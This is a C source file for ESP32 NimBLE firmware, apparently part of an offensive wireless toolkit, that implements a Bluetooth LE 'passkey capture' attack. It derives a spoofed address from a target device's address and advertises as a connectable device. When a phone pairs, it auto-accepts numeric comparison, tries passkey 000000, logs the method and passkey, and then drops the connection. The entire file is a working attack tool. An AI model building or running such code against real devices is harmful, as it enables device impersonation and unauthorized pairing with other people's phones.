/* BLE Passkey Capture - Copy to: main/bt/ble_passkey.c */
#include "ble_passkey.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <string.h>
#include <stdio.h>

#include "nimble/nimble_port.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "services/gap/ble_svc_gap.h"
#include "services/gatt/ble_svc_gatt.h"

#include "ble_common.h"

static const char *TAG = "ble_passkey";

static bool running = false;
static TaskHandle_t task_handle = NULL;
static char target[32] = {0};
static SemaphoreHandle_t mutex = NULL;
static SemaphoreHandle_t task_exit_sem = NULL;
static SemaphoreHandle_t pair_done_sem = NULL;
static bool gatt_registered = false;

static char captured_method[32] = "none";
static char captured_passkey[16] = "";
static uint16_t active_conn_handle = 0xFFFF;
static bool pairing_complete = false;

static uint8_t saved_sm_io_cap = 0;
static uint8_t saved_sm_bonding = 0;
static uint8_t saved_sm_mitm = 0;
static uint8_t saved_sm_sc = 0;
static uint8_t saved_sm_our_key_dist = 0;
static uint8_t saved_sm_their_key_dist = 0;

/* ---- GATT Server ---- */
static const char *device_name = "BLE_Capture";

static int gap_chr_access(uint16_t conn_handle, uint16_t attr_handle,
                          struct ble_gatt_access_ctxt *ctxt, void *arg) {
    int rc;
    switch (ctxt->op) {
        case BLE_GATT_ACCESS_OP_READ_CHR:
            rc = os_mbuf_append(ctxt->om, device_name, strlen(device_name));
            return rc == 0 ? 0 : BLE_ATT_ERR_INSUFFICIENT_RES;
        default:
            return BLE_ATT_ERR_UNLIKELY;
    }
}

static const struct ble_gatt_svc_def gatt_svcs[] = {
    {
        .type = BLE_GATT_SVC_TYPE_PRIMARY,
        .uuid = BLE_UUID16_DECLARE(BLE_SVC_GAP_UUID16),
        .includes = NULL,
        .characteristics = (struct ble_gatt_chr_def[]) {
            {
                .uuid = BLE_UUID16_DECLARE(BLE_SVC_GAP_CHR_UUID16_DEVICE_NAME),
                .access_cb = gap_chr_access,
                .arg = NULL,
                .flags = BLE_GATT_CHR_F_READ,
                .val_handle = NULL,
                .descriptors = NULL,
            },
            {0}
        },
    },
    {
        .type = BLE_GATT_SVC_TYPE_PRIMARY,
        .uuid = BLE_UUID16_DECLARE(0x1801),
        .includes = NULL,
        .characteristics = (struct ble_gatt_chr_def[]) {
            {
                .uuid = BLE_UUID16_DECLARE(0x2A05),
                .access_cb = NULL,
                .arg = NULL,
                .flags = BLE_GATT_CHR_F_INDICATE,
                .val_handle = NULL,
                .descriptors = NULL,
            },
            {0}
        },
    },
    {
        .type = BLE_GATT_SVC_TYPE_PRIMARY,
        .uuid = BLE_UUID16_DECLARE(0x180F),
        .includes = NULL,
        .characteristics = (struct ble_gatt_chr_def[]) {
            {
                .uuid = BLE_UUID16_DECLARE(0x2A19),
                .access_cb = NULL,
                .arg = NULL,
                .flags = BLE_GATT_CHR_F_READ | BLE_GATT_CHR_F_NOTIFY,
                .val_handle = NULL,
                .descriptors = NULL,
            },
            {0}
        },
    },
    {0}
};

/* ---- Helpers ---- */
static void addr_from_str(const char *s, uint8_t out[6]) {
    int vals[6] = {0};
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &vals[0], &vals[1], &vals[2],
               &vals[3], &vals[4], &vals[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            out[i] = (uint8_t)vals[5 - i];
        }
    } else {
        memset(out, 0, 6);
    }
}

static void cleanup_ble(void) {
    int max_wait = 10;
    while (max_wait-- > 0) {
        bool busy = ble_gap_conn_active() || ble_gap_adv_active() || ble_gap_disc_active();
        if (!busy) break;
        if (ble_gap_conn_active()) ble_gap_conn_cancel();
        if (ble_gap_adv_active()) ble_gap_adv_stop();
        if (ble_gap_disc_active()) ble_gap_disc_cancel();
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    ble_common_disconnect_all();
    vTaskDelay(pdMS_TO_TICKS(100));
}

static void save_sm_config(void) {
    saved_sm_io_cap = ble_hs_cfg.sm_io_cap;
    saved_sm_bonding = ble_hs_cfg.sm_bonding;
    saved_sm_mitm = ble_hs_cfg.sm_mitm;
    saved_sm_sc = ble_hs_cfg.sm_sc;
    saved_sm_our_key_dist = ble_hs_cfg.sm_our_key_dist;
    saved_sm_their_key_dist = ble_hs_cfg.sm_their_key_dist;
}

static void set_capture_sm_config(void) {
    ble_hs_cfg.sm_io_cap = BLE_SM_IO_CAP_KEYBOARD_DISP;
    ble_hs_cfg.sm_bonding = 1;
    ble_hs_cfg.sm_mitm = 1;
    ble_hs_cfg.sm_sc = 1;
    ble_hs_cfg.sm_our_key_dist = BLE_SM_PAIR_KEY_DIST_ENC |
                                  BLE_SM_PAIR_KEY_DIST_ID;
    ble_hs_cfg.sm_their_key_dist = BLE_SM_PAIR_KEY_DIST_ENC |
                                    BLE_SM_PAIR_KEY_DIST_ID;
}

static void restore_sm_config(void) {
    ble_hs_cfg.sm_io_cap = saved_sm_io_cap;
    ble_hs_cfg.sm_bonding = saved_sm_bonding;
    ble_hs_cfg.sm_mitm = saved_sm_mitm;
    ble_hs_cfg.sm_sc = saved_sm_sc;
    ble_hs_cfg.sm_our_key_dist = saved_sm_our_key_dist;
    ble_hs_cfg.sm_their_key_dist = saved_sm_their_key_dist;
}

/* ---- GAP Event Handler ---- */
static int passkey_gap_cb(struct ble_gap_event *event, void *arg) {
    switch (event->type) {

        case BLE_GAP_EVENT_CONNECT:
            ESP_LOGI(TAG, "CONNECT: status=%d conn_handle=%d",
                     event->connect.status, event->connect.conn_handle);
            if (event->connect.status == 0) {
                active_conn_handle = event->connect.conn_handle;
                pairing_complete = false;
                ESP_LOGI(TAG, "Phone connected! Waiting for pairing...");
            } else {
                ESP_LOGW(TAG, "Connect failed: status=%d", event->connect.status);
                active_conn_handle = 0xFFFF;
                if (pair_done_sem) xSemaphoreGive(pair_done_sem);
            }
            break;

        case BLE_GAP_EVENT_DISCONNECT:
            ESP_LOGI(TAG, "DISCONNECT: reason=%d", event->disconnect.reason);
            active_conn_handle = 0xFFFF;
            if (pair_done_sem) xSemaphoreGive(pair_done_sem);
            break;

        case BLE_GAP_EVENT_PASSKEY_ACTION: {
            struct ble_sm_io pkey = {0};
            pkey.action = event->passkey.params.action;

            ESP_LOGI(TAG, "PASSKEY ACTION: action=%d", event->passkey.params.action);

            switch (event->passkey.params.action) {
                case BLE_SM_IOACT_NUMCMP: {
                    ESP_LOGI(TAG, "===========================================");
                    ESP_LOGI(TAG, "  NUMERIC COMPARISON - Auto-accepting");
                    ESP_LOGI(TAG, "===========================================");
                    snprintf(captured_method, sizeof(captured_method), "numeric_comparison");
                    snprintf(captured_passkey, sizeof(captured_passkey), "accepted");
                    pkey.numcmp_accept = 1;
                    break;
                }

                case BLE_SM_IOACT_DISP: {
                    uint32_t pk = esp_random() % 1000000;
                    ESP_LOGI(TAG, "===========================================");
                    ESP_LOGI(TAG, "  DISPLAY PASSKEY: %06lu", (unsigned long)pk);
                    ESP_LOGI(TAG, "===========================================");
                    snprintf(captured_method, sizeof(captured_method), "passkey_display");
                    snprintf(captured_passkey, sizeof(captured_passkey), "%06lu", (unsigned long)pk);
                    pkey.passkey = pk;
                    break;
                }

                case BLE_SM_IOACT_INPUT: {
                    ESP_LOGI(TAG, "===========================================");
                    ESP_LOGI(TAG, "  INPUT PASSKEY: Trying 000000");
                    ESP_LOGI(TAG, "===========================================");
                    snprintf(captured_method, sizeof(captured_method), "passkey_input");
                    snprintf(captured_passkey, sizeof(captured_passkey), "000000");
                    pkey.passkey = 0;
                    break;
                }

                case BLE_SM_IOACT_OOB:
                    ESP_LOGI(TAG, "  OOB pairing (not supported)");
                    snprintf(captured_method, sizeof(captured_method), "oob");
                    snprintf(captured_passkey, sizeof(captured_passkey), "n/a");
                    break;

                default:
                    snprintf(captured_method, sizeof(captured_method), "unknown");
                    break;
            }

            int rc = ble_sm_inject_io(event->passkey.conn_handle, &pkey);
            if (rc != 0) {
                ESP_LOGW(TAG, "ble_sm_inject_io failed: rc=%d", rc);
            }
            break;
        }

        case BLE_GAP_EVENT_ENC_CHANGE:
            ESP_LOGI(TAG, "ENC_CHANGE: status=%d", event->enc_change.status);
            if (event->enc_change.status == 0) {
                ESP_LOGI(TAG, "===========================================");
                ESP_LOGI(TAG, "  PAIRING COMPLETE!");
                ESP_LOGI(TAG, "  Method: %s", captured_method);
                ESP_LOGI(TAG, "  Passkey: %s", captured_passkey);
                ESP_LOGI(TAG, "===========================================");
                pairing_complete = true;
                vTaskDelay(pdMS_TO_TICKS(1000));
                if (active_conn_handle != 0xFFFF) {
                    ble_gap_terminate(active_conn_handle,
                                      BLE_ERR_REM_USER_CONN_TERM);
                }
            } else {
                ESP_LOGW(TAG, "Pairing FAILED: status=%d",
                         event->enc_change.status);
                snprintf(captured_method, sizeof(captured_method), "failed");
            }
            break;

        case BLE_GAP_EVENT_REPEAT_PAIRING:
            return BLE_GAP_REPEAT_PAIRING_RETRY;

        case BLE_GAP_EVENT_MTU:
            ESP_LOGD(TAG, "MTU: %d", event->mtu.value);
            break;

        default:
            break;
    }
    return 0;
}

/* ---- Spoof + Advertise ---- */
static void start_spoof_adv(void) {
    uint8_t target_addr[6];
    xSemaphoreTake(mutex, portMAX_DELAY);
    char copy[32];
    strncpy(copy, target, sizeof(copy) - 1);
    copy[sizeof(copy) - 1] = '\0';
    xSemaphoreGive(mutex);
    addr_from_str(copy, target_addr);

    uint8_t spoof_addr[6];
    memcpy(spoof_addr, target_addr, 6);
    spoof_addr[5] = (spoof_addr[5] & 0x3F) | 0xC0;

    int rc = ble_hs_id_set_rnd(spoof_addr);
    if (rc != 0) {
        ESP_LOGW(TAG, "Failed to set random addr (rc=%d)", rc);
    }

    uint8_t adv_data[] = {
        0x02, 0x01, 0x06,
        0x03, 0x03, 0x0F, 0x18,
        0x04, 0x09, 'C', 'a', 'p',
    };

    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_UND,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min = 0x0020,
        .itvl_max = 0x0030,
        .channel_map = 0x07,
        .filter_policy = 0,
    };

    rc = ble_gap_adv_set_data(adv_data, sizeof(adv_data));
    if (rc != 0) {
        ESP_LOGE(TAG, "Set adv data failed: %d", rc);
        return;
    }

    rc = ble_gap_adv_start(1, NULL, BLE_HS_FOREVER,
                           &adv_params, passkey_gap_cb, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "Adv start failed: %d", rc);
        return;
    }

    ESP_LOGI(TAG, "Spoof advertising as %s", copy);
}

/* ---- Main task ---- */
static void passkey_task(void *arg) {
    ESP_LOGI(TAG, "BLE Passkey Capture started for %s", target);

    snprintf(captured_method, sizeof(captured_method), "none");
    captured_passkey[0] = '\0';
    active_conn_handle = 0xFFFF;
    pairing_complete = false;

    save_sm_config();
    set_capture_sm_config();

    cleanup_ble();
    start_spoof_adv();

    int waited = 0;
    while (running && waited < 60000) {
        vTaskDelay(pdMS_TO_TICKS(500));
        waited += 500;
        if (pairing_complete) {
            vTaskDelay(pdMS_TO_TICKS(2000));
            break;
        }
    }

    if (!pairing_complete) {
        ESP_LOGW(TAG, "Passkey capture timed out");
        snprintf(captured_method, sizeof(captured_method), "timeout");
    }

    if (ble_gap_adv_active()) ble_gap_adv_stop();
    cleanup_ble();
    restore_sm_config();

    ESP_LOGI(TAG, "Done. Method=%s Passkey=%s", captured_method, captured_passkey);

    running = false;
    task_handle = NULL;
    if (task_exit_sem) xSemaphoreGive(task_exit_sem);
    vTaskDelete(NULL);
}

/* ---- Public API ---- */

void ble_passkey_init(void) {
    if (mutex == NULL) mutex = xSemaphoreCreateMutex();
    if (task_exit_sem == NULL) task_exit_sem = xSemaphoreCreateBinary();
    if (pair_done_sem == NULL) pair_done_sem = xSemaphoreCreateBinary();

    if (!gatt_registered) {
        ble_gatts_count_cfg(gatt_svcs);
        ble_gatts_add_svcs(gatt_svcs);
        gatt_registered = true;
    }

    ble_common_init();
    ESP_LOGI(TAG, "ble_passkey initialized");
}

void ble_passkey_start(const char *target_addr) {
    if (running) return;
    if (mutex == NULL) mutex = xSemaphoreCreateMutex();
    if (pair_done_sem == NULL) pair_done_sem = xSemaphoreCreateBinary();

    xSemaphoreTake(mutex, portMAX_DELAY);
    strncpy(target, target_addr ? target_addr : "", sizeof(target) - 1);
    target[sizeof(target) - 1] = '\0';
    xSemaphoreGive(mutex);

    snprintf(captured_method, sizeof(captured_method), "none");
    captured_passkey[0] = '\0';

    running = true;
    if (task_exit_sem != NULL) xSemaphoreTake(task_exit_sem, 0);

    BaseType_t ret = xTaskCreate(passkey_task, "ble_passkey", 4096, NULL, 5, &task_handle);
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create passkey task");
        running = false;
    }
}

void ble_passkey_stop(void) {
    if (!running) return;
    running = false;

    if (pair_done_sem) xSemaphoreGive(pair_done_sem);

    if (task_exit_sem != NULL) {
        if (xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(5000)) != pdTRUE) {
            ESP_LOGW(TAG, "Task exit timeout");
            if (task_handle != NULL) {
                vTaskDelete(task_handle);
                task_handle = NULL;
            }
        }
    } else {
        vTaskDelay(pdMS_TO_TICKS(1000));
        if (task_handle != NULL) {
            vTaskDelete(task_handle);
            task_handle = NULL;
        }
    }

    restore_sm_config();
    ESP_LOGI(TAG, "BLE Passkey Capture stopped");
}

bool ble_passkey_is_running(void) {
    return running;
}

const char* ble_passkey_get_info(void) {
    static char info[256];
    snprintf(info, sizeof(info),
             "{\"running\":%s,\"method\":\"%s\",\"passkey\":\"%s\"}",
             running ? "true" : "false",
             captured_method,
             captured_passkey);
    return info;
}
